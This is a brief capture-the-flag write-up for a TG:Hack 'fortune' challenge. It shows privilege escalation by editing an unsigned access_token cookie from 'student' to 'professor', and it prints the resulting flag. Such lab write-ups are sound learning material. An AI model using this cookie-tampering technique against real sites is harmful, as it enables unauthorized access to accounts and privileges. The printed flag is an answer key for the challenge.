CHALLENGE INFO

  • CHALLENGE LINK: https://fortune.tghack.no/
  • ASSUMED OBJECTIVE: Alter the siteâ€™s cookies to get the flag

1. Check cookies

  • From HTTP Response Headers: 
    ...
Set-Cookie: access_token=divination:student
...

2. Change the value of access_token

  • HTTP Request Headers: 
    ...
Cookie: access_token=divination:professor
...
  • Changing the value to divination:professor returns: 
    OMG! You're so fortunate! Take this flag: TG19{what_a_fortune_my_lucky_one}

FLAG : TG19{what_a_fortune_my_lucky_one}
